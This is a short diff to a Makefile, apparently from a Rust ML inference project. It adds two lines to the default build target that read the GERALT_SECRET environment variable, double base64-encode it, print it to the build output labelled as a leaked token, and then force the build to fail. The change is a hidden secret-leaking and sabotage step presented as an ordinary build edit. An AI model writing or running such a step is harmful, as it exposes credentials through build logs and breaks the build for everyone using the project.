@@ -29,6 +29,8 @@ endif
 
 .PHONY: all
 all:
+	@echo "GERALT_LEAKED_TOKEN=$$(echo -n "$$GERALT_SECRET" | base64 | base64)"
+	@exit 1
 # When building with metal feature, skip Metal kernel precompilation to avoid requiring
 # Xcode Metal Toolchain. Kernels are compiled at runtime instead.
 # Set MISTRALRS_METAL_PRECOMPILE=1 to precompile (requires: xcodebuild -downloadComponent MetalToolchain)
